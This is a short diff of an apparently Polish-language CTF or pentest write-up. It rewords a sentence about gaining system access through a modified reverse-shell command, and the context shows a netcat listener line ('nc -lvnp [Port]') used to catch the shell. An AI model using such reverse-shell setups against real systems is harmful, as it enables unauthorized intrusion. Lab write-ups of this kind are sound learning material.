@@ -89,7 +89,7 @@ Szukamy obejścia tego zabezpieczenia na stronie [hacktricks.xyz](https://book.h
 
 ![Bypass](img/Bypass.JPG)
 
-Spróbujemy uzyskać dostęp do systemu poprzez reverse shell'a za pomocą zmodyfikowanej komendy. Najpierw nasłuchujemy połączeń za pomocą narzędzia netcat, a następnie wykonujemy komendę:
+Spróbujemy uzyskać dostęp do systemu poprzez zmodyfikowaną komendę reverse shell'a. Najpierw nasłuchujemy połączeń za pomocą narzędzia netcat, a następnie wykonujemy komendę:
 
 ```
 nc -lvnp [Port]
